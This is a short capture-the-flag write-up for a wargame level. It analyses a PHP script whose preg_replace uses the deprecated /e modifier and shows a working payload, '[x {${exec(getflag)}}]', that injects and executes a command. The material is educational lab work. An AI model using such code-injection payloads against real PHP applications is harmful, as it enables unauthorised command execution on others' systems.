<h1 align="center"> level06 </h1>

```shell
ls -la
```

We have 2 files:
```
level06
level06.php
```

```shell
strings level06
```

We see this line:
```
/home/user/level06/level06.php
```
So the binary call .php file

Now the .php:
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

with comments:
```php
#!/usr/bin/php
<?php
function y($m) 
{
  $m = preg_replace("/\./", " x ", $m); //replace "." with " x ""
  $m = preg_replace("/@/", " y", $m); //replace "@" with " y"
  return $m; 
}
function x($y, $z) 
{ 
  $a = file_get_contents($y); 
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); //extract content from shape  [x ...] and pass i to funct y
  $a = preg_replace("/\[/", "(", $a); //replace "[" with "("
  $a = preg_replace("/\]/", ")", $a); //replace "]" with ")"
  return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

The security breach is the ```/e``` who is deprecated. It allows evaluation of the replacement string as PHP code.

First I try
```shell
echo '[x ${exec(getflag)}]' > /tmp/level06
```
But it failed:
```
./level06 /tmp/level06
PHP Parse error:  syntax error, unexpected '(' in /home/user/level06/level06.php(4) : regexp code on line 1
```
Because this syntax in also deprecated, we need to add ```{}``` like this:
```
echo '[x {${exec(getflag)}}]' > /tmp/level06
```
And then:
```
./level06 /tmp/level06
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token
```

We have the getflag result, who allows us to pass to the next level, it work !
